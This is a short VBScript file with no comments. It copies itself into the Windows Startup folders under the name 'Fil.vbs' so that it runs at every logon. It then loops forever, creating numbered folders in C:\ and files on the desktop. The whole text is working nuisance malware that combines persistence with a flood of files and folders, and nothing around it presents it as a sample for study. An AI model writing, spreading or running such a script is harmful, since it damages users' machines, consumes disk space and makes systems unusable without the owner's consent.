On Error Resume Next

Set WSHShell = WScript.CreateObject("WScript.Shell")
FileName = WScript.ScriptFullName
Directory = WshShell.CurrentDirectory
Autostart = WSHShell.SpecialFolders("AllUsersStartup")
Autostart2 = WSHShell.SpecialFolders("Startup")

Set fso = CreateObject("Scripting.FileSystemObject")
Set f2 = fso.GetFile( FileName )
f2.Copy ( Autostart & "\Fil.vbs")
f2.Copy ( Autostart2 & "\Fil.vbs")


Desktop = WSHShell.SpecialFolders("Desktop")
Folder = WSHShell.SpecialFolders("AllUsersDesktop")

If fso.FolderExists( Folder ) Then
Desktop = WSHShell.SpecialFolders("AllUsersDesktop")
Else
Desktop = WSHShell.SpecialFolders("Desktop")
End if

i = 1
w = 1
do
fso.CreateFolder("C:\" & i )
fso.CreateTextFile( Desktop& "\" & i )
i = i + 1

Loop while w=1